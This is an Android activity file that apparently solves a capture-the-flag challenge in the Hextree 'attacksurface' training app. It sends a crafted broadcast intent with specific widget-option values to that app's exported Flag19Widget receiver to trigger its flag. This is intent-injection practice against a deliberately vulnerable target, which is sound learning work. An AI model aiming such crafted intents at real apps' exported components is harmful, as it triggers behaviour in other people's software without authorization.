package niraj.patali.sendingdatatowidget;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // Build an intent with the proper action.
        Intent updateIntent = new Intent("APPWIDGET_UPDATE");

        // (Optional) Explicitly target the widget's broadcast receiver in the other app.
        // Make sure the package and class names match those in the io.hextree.attacksurface app.
        updateIntent.setComponent(new ComponentName(
                "io.hextree.attacksurface",                // Target app's package name
                "io.hextree.attacksurface.receivers.Flag19Widget"  // Fully qualified class name of the widget receiver
        ));

        // Create a bundle with the required widget options.
        Bundle widgetOptions = new Bundle();
        widgetOptions.putInt("appWidgetMaxHeight", 1094795585);
        widgetOptions.putInt("appWidgetMinHeight", 322376503);

        // Put the bundle into the intent.
        updateIntent.putExtra("appWidgetOptions", widgetOptions);

        // Send the broadcast. This should trigger the widget's onReceive and thus call success().
        sendBroadcast(updateIntent);

        // Optionally finish this activity if no UI is needed.
        finish();
    }
}